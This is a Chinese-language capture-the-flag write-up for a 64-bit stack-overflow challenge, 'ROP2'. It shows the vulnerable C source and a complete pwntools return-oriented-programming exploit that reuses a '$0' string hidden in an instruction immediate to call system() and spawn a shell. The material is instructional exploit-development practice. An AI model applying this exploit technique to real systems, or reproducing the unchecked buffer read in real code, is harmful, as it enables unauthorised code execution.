# ROP2

## 题目简述

本题同样是 amd64 栈溢出，但程序没有直接保存 `sh` 字符串。`main()` 中的超大整数常量在机器码里以小端立即数编码，其字节序列中恰好包含 `$0\x00`；程序调用 `system()` 输出提示，因此二进制也存在可复用的 `system@plt`。

## 解题过程

关键源码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void gadget()
{
    asm volatile (
        "pop %rdi;\n"
        "ret;\n"
    );
}

void init()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

int main()
{
    init();
    char s[0x30];
    printf("Before start I can give you my luck_number : %d\n",0x9173003024);
    system("echo Start your attack");
    read(0,s,0x100);
    return 0;
}
```

与 ROP1 相比，变化只在参数字符串的来源。`system()` 原本执行的是 `echo Start your attack`，并不是 `$0`；真正可利用的 `$0\x00` 藏在 `luck_number` 常量对应的 `.text` 机器码立即数中。

在 pwndbg 中可以搜索该字节串：

```text
pwndbg> search "$0"
pwn  0x401202 ... /* '$0' */
```

`s` 为 `0x30` 字节，覆盖返回地址需要 `0x38` 字节。ROP 链仍是设置 `rdi` 后调用 `system()`；当 `/bin/sh -c '$0'` 执行时，`$0` 展开为当前 Shell，从而获得交互 Shell。

```python
from pwn import *

elf = context.binary = ELF('./pwn', checksec=False)
rop = ROP(elf)
io = process(elf.path)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
shell_arg = next(elf.search(b'$0\x00'))
payload = flat(
    b'A' * 0x38,
    pop_rdi,
    shell_arg,
    elf.plt['system'],
)

io.sendline(payload)
io.interactive()
```

## 方法总结

- 核心技巧：从指令立即数中复用非预期的空字节结尾字符串作为 ROP 参数。
- 识别信号：栈溢出和 `system@plt` 已存在，但常规数据段中缺少理想命令字符串。
- 复用要点：搜索字符串时不要局限于 `.rodata`；可执行段中的立即数、指令编码和地址中也可能形成可用字节序列。
